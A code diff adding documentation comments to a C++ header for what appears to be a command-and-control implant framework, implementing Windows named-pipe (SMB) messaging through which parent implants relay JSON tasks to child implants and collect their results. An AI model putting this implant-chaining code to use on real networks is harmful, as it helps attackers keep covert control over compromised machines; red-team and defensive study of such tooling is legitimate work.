@@ -1,20 +1,8 @@
-/*
+/**
+ * @file smb_comms.h
+ * @brief Handles SMB/Named Pipe communication between parent and child implants.
+ */
 
-SMB Comms
-
-Need:
-
-(listener)
-- [ ] Setup pipes (sets up smb pipes)
-
-(both)
-- [ ] Read pipe
-- [ ] Write pipe
-
-and an internal chain map that tells what my implant is connected to, and what to send to/relay tasks to (later)
-
-*/
-//temp as .h for now
 #pragma once
 
 #include <windows.h>
@@ -28,12 +16,22 @@ and an internal chain map that tells what my implant is connected to, and what t
 //Awaits for a parent to connect to the pipe. IF we don't have this, we get an immediate
 //536 pipe error: Waiting for a process to open the other end of the pipe.
 
-
-
-
+/**
+ * @namespace SMB
+ * @brief Encapsulates all Server Message Block (SMB) and Named Pipe routing logic.
+ */
 //for routing to smb
 namespace SMB {
 
+    /**
+     * @brief Dynamically reads data from a specified named pipe into a buffer.
+     * * Reads in chunks of 8192 bytes, handling cases where the incoming data is 
+     * larger than the chunk size (ERROR_MORE_DATA) by looping until the transfer completes.
+     * * @param h_pipe A handle to the pipe to read from.
+     * @param out_buffer A reference to a byte vector where the read data will be stored. 
+     * This buffer is cleared before reading begins.
+     * @return DWORD Returns ERROR_SUCCESS (0) on success, or a Windows API error code on failure.
+     */
     //generic pipe reader to dynamically read the pipe
     DWORD read_pipe_dynamic(HANDLE h_pipe, std::vector<uint8_t>& out_buffer) {
         const DWORD CHUNK_SIZE = 8192;
@@ -76,7 +74,19 @@ namespace SMB {
     If we are the child.... these are the funcs we want
     
     */
+    /**
+     * @namespace SMB::Child
+     * @brief Contains pipe operations intended for use by the child implant.
+     */
     namespace Child {
+
+        /**
+         * @brief Synchronously waits for a client (parent) to connect to the named pipe.
+         * * @param h_pipe The handle to the named pipe instance.
+         * @param pipe_name The string identifier for the pipe, used primarily for debug logging.
+         * @return true If the parent successfully connects or is already connected.
+         * @return false If the connection attempt fails.
+         */
         bool await_client_connection(HANDLE h_pipe, const std::string& pipe_name) {
             DEBUG_LOG("[SMB::Child::await_client_connection]: Waiting for parent to connect to " << pipe_name << " pipe...");
 
@@ -92,51 +102,14 @@ namespace SMB {
             DEBUG_LOG("[SMB::Child::await_client_connection]: Parent connected to " << pipe_name << "!");
             return true;
         }
-
-        //in comms.h now
-        // int register_pipe(HANDLE& h_inbox_pipe, HANDLE& h_outbox_pipe) {
-        //     std::wstring wstr_pipe_inbox = L"\\\\.\\pipe\\inbox2";
-
-        //     DEBUG_LOG("[SMB::Child::register_pipe]: Attempting to register pipe" << std::string(wstr_pipe_inbox.begin(), wstr_pipe_inbox.end()));
-
-        //     // STRIPPED: FILE_FLAG_OVERLAPPED
-        //     h_inbox_pipe = WinApi::CreateNamedPipeW(
-        //         wstr_pipe_inbox.c_str(),
-        //         PIPE_ACCESS_INBOUND,
-        //         PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT | PIPE_ACCEPT_REMOTE_CLIENTS,
-        //         1, 4096, 4096, 0, NULL
-        //     );
-
-        //     if (h_inbox_pipe == INVALID_HANDLE_VALUE) {
-        //         DEBUG_LOG("[SMB::Child::register_pipe]: Pipe registration failed: " << std::string(wstr_pipe_inbox.begin(), wstr_pipe_inbox.end()) << " Error: " << WinApi::GetLastError());
-        //         return 1;
-        //     }
-        //     DEBUG_LOG("[SMB::Child::register_pipe]: Pipe registered successfully: " << std::string(wstr_pipe_inbox.begin(), wstr_pipe_inbox.end()));
-
-        //     std::wstring wstr_pipe_outbox = L"\\\\.\\pipe\\outbox2";
-
-        //     DEBUG_LOG("[SMB::Child::register_pipe]: Attempting to register pipe" << std::string(wstr_pipe_outbox.begin(), wstr_pipe_outbox.end()));
-
-        //     // STRIPPED: FILE_FLAG_OVERLAPPED
-        //     h_outbox_pipe = WinApi::CreateNamedPipeW(
-        //         wstr_pipe_outbox.c_str(),
-        //         PIPE_ACCESS_OUTBOUND,
-        //         PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT | PIPE_ACCEPT_REMOTE_CLIENTS,
-        //         1, 4096, 4096, 0, NULL
-        //     );
-
-        //     if (h_outbox_pipe == INVALID_HANDLE_VALUE) {
-        //         DEBUG_LOG("[SMB::Child::register_pipe]: Pipe registration failed: " <<std::string(wstr_pipe_outbox.begin(), wstr_pipe_outbox.end()) << " Error: " << WinApi::GetLastError());
-        //         return 1;
-        //     }
-
-        //     // Await connection for both pipes
-        //     if (!await_client_connection(h_inbox_pipe, "INBOX")) return 1;
-        //     if (!await_client_connection(h_outbox_pipe, "OUTBOX")) return 1;
-
-        //     return 0;
-        // }
     
+        /**
+         * @brief Sends a check-in request to the parent and retrieves pending tasks.
+         * * @param h_inbox The pipe handle to read responses from the parent.
+         * @param h_outbox The pipe handle to send the check-in request up to the parent.
+         * @param get_request_payload The serialized payload representing the GET request.
+         * @return std::vector<uint8_t> A buffer containing the tasks sent by the parent, or an empty buffer if it fails.
+         */
         std::vector<uint8_t> fetch_tasks(HANDLE h_inbox, HANDLE h_outbox, const std::vector<uint8_t>& get_request_payload) {
             DWORD bytes_written = 0;
             DEBUG_LOG("[SMB::Child::fetch_tasks]: Fetching Tasks");
@@ -159,6 +132,13 @@ namespace SMB {
             return {};
         }
 
+        /**
+         * @brief Synchronously sends data up to the parent via the outbox pipe.
+         * * @param h_outbox The pipe handle to write the data to.
+         * @param payload The raw byte vector representing the data/response to send.
+         * @return true If the data was successfully written to the pipe.
+         * @return false If the payload is empty, handle is invalid, or the write fails.
+         */
         bool send_data(HANDLE h_outbox, const std::vector<uint8_t>& payload) {
             if (payload.empty() || h_outbox == INVALID_HANDLE_VALUE) {
                 DEBUG_LOG("[SMB::Child::send_data]: Payload empty or outbox handle is invalid: " << WinApi::GetLastError());
@@ -182,8 +162,20 @@ namespace SMB {
     If we are the parent... these are the funcs we want
     
     */
+    /**
+     * @namespace SMB::Parent
+     * @brief Contains pipe operations intended for use by the parent (controller/router) implant.
+     */
     namespace Parent { //rename cycle child
                 
+        /**
+         * @brief Executes a full interaction cycle with a downstream child implant.
+         * * @param h_write The pipe handle used to send tasks down to the child.
+         * @param h_read The pipe handle used to read the child's check-in and execution responses.
+         * @param raw_task The JSON task payload to send to the child for execution.
+         * @param expect_response A flag indicating whether to block and wait for a response after tasking.
+         * @return nlohmann::json The JSON response from the child if expect_response is true; otherwise, an empty JSON object.
+         */
         nlohmann::json cycle_child(HANDLE h_write, HANDLE h_read, const nlohmann::json& raw_task, bool expect_response) {
             /*
             Cycle the SMB child.
